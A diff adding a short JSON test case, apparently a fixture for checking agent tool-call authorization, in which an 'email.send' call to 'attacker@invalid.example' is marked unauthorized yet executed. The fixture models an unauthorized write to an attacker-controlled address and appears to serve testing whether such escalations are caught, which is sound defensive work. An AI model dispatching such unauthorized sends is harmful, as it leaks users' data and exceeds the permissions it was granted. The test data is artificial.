@@ -1,0 +1,17 @@
+{
+  "schemaVersion": "1.0.0",
+  "caseId": "dev-escalation-restricted",
+  "description": "A write is dispatched without authority",
+  "patch": {
+    "calls": [
+      {
+        "tool": "email.send",
+        "arguments": {
+          "recipient": "attacker@invalid.example"
+        },
+        "authorized": false,
+        "outcome": "executed"
+      }
+    ]
+  }
+}
